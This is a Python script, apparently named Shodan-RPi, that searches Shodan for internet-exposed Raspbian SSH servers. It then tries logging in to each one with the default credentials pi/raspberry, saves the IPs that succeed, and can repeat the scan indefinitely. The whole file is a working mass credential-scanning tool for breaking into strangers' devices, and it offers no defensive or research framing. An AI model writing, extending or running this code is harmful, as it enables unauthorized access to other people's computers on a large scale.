from __future__ import print_function
from colorama import Fore, init
import argparse, os, socket, sys, paramiko, shodan

api_key = None # Set to None if you want to provide a key through arguments

init() # Colored output

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--input',
                    help='List of IPs',
                    metavar='FILE',
                    type=str,
                    default=None) # Input file argument, by default it writes to memory (list/array)
parser.add_argument('-n', '--no-exit',
                    help='Run indefinitely, restarting once the scan is finished',
                    action='store_true') # Don't exit on completion, but instead poll Shodan again
parser.add_argument('-k', '--api-key',
                    help='Use KEY as the Shodan API key',
                    metavar='KEY',
                    type=str,
                    default=api_key) # API Key (the error on startup can be resolved by changing the api_key variable)
parser.add_argument('-l', '--log-paramiko',
                    help='Log Paramiko SSH\'s progress to FILE',
                    metavar='FILE',
                    type=str,
                    default='paramiko.log') # Paramiko (the SSH client)'s log file location
parser.add_argument('-w', '--workfile',
                    help='Output successful IPs to FILE',
                    metavar='FILE',
                    type=str,
                    default='successful.txt') # Where to output successful IPs
parser.add_argument('-u', '--username',
                    help='Use alternate username',
                    type=str,
                    default='pi') # For alternate usernames
parser.add_argument('-p', '--password',
                    help='Use alternate password',
                    type=str,
                    default='raspberry') # For alternate passwords
parser.add_argument('-d', '--debug',
                    help='Show debug information',
                    action='store_true')
args = parser.parse_args()

failtext = Fore.RED + '\tFAILED' + Fore.RESET
succtext = Fore.GREEN + '\tSUCCEEDED' + Fore.RESET

def fileExists():
	"""
		Check if the file provided using the -i/--input argument exists
	"""
	if os.path.isfile(args.input) == False or os.path.getsize(args.input) == 0:
		return False
	else:
		return True

def arrayWrite(shodandata=None):
	"""
		Parse the IPs in shodandata and write them to an array/list
	"""
	r = []
	if shodandata == None:
		print('[-] arrayWrite() was called without any data!\n    If this happened on the production version, please create an issue on GitHub.')
		sys.exit(1)
	print('[*] Creating array using Shodan IPs...')
	for a in shodandata['matches']:
		r.append(a['ip_str'])
	return r

def getShodanResults(apikey, searchstring='Raspbian SSH'):
	"""
		Poll Shodan for results
	"""
	api = shodan.Shodan(apikey)
	try:
		results = api.search(searchstring)
		return results
	except shodan.APIError, e:
		print('[-] Shodan API Error\n    Error string: %s\n\n    Please check the provided API key.' % str(e))
		sys.exit(1)

def fileGet(shodandata=None):
	"""
		Call fileExists(), parse the IPs in shodandata, and write them to a file
	"""
	if args.input == None:
		print('[-] fileGet() was called, but a file wasn\'t provided!\n    If this happened on the production version, please create an issue on GitHub.')
		sys.exit(1)
	if fileExists() == False:
		print('[!] %s doesn\'t exist, creating new file with Shodan results...' % args.input)
		try:
			with open(args.input, 'w') as m:
				for a in shodandata['matches']:
					m.write(a['ip_str']+'\n')
		except IOError, e:
			print('[-] Storage Write Error\n    Error string: %s\n\n    Please check that the directory you\'re in is writable.' % str(e))
			sys.exit(1)
		print('[+] Write to %s complete!' % args.input)
	else:
		g = open(args.input, 'r').readlines()
		return map(lambda g: g.strip(), g)

def apikey():
	"""
		Get the API key
	"""
	if args.api_key == None:
		print('[-] No API key provided. Either use the -k/--api-key argument\n    or edit the script.')
		sys.exit(1)
	else:
		return args.api_key

def connect(server, username, password):
	"""
		SSH connect function
	"""
	try:
		ssh.connect(server, username=username, password=password, timeout=5) # Lowered timeout from 8 to 5
		with open(args.workfile, 'w+') as fl:
			fl.write(server+'\n')
			fl.close()
		ssh.close()
		return 'success'
	except paramiko.AuthenticationException:
		return 'auth_fail'
	except paramiko.ssh_exception.NoValidConnectionsError:
		return 'conn_fail'
	except socket.error:
		return 'conn_timeout'
	except paramiko.ssh_exception.SSHException:
		return 'conn_fail'
	except KeyboardInterrupt:
		return 'interrupt'
	except:
		raise

def main():
	counter = 0
	success = 0
	if args.input == None:
		targets = arrayWrite(shodandata=getShodanResults(key)) # In-memory
	else:
		targets = fileGet(shodandata=getShodanResults(key)) # From file
	try:
		for ip in targets:
			counter += 1
			print('[%s] Trying %s... ' % (counter, ip), end='')
			r = connect(ip, args.username, args.password)
			# if r == 'auth_fail':
			# 	print('Authentication failure.')
			# elif r == 'conn_fail':
			# 	print('Connection failure.')
			# elif r == 'conn_timeout':
			# 	print('Connection timed out.')
			if r == 'auth_fail' or r == 'conn_fail' or r == 'conn_timeout':
				print(failtext)
			elif r == 'success':
				success += 1
				print(succtext)
			elif r == 'interrupt':
				raise KeyboardInterrupt
		if not args.no_exit:
			print('\n[+] Completed!\n    Total IPs tried: %s\n    Total successes: %s\n' % (counter, success))
	except KeyboardInterrupt:
		print('\n\n[!] Interrupted!\n    Total IPs tried: %s\n    Total successes: %s\n' % (counter, success))
		sys.exit(0)

if __name__ == "__main__":
	print('[i] Shodan-RPi\n    by b3/btx3 (original code by somu1795)')
	if args.input != None:
		print('[i] Set target file to %s\n' % args.input)
	else:
		print('[i] Not writing to file.\n')
	key = apikey()
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # Revert to AutoAddPolicy, as otherwise you would get lots of errors
	paramiko.util.log_to_file(args.log_paramiko)
	print('[+] Starting!')
	if args.no_exit and not args.input:
		print('[!] Running indefinitely! Press Ctrl+C to stop.')
		while True:
			main()
	elif args.no_exit and args.input:
		print('[-] -n/--no-exit is not available when reading from a file.')
	else:
		main()
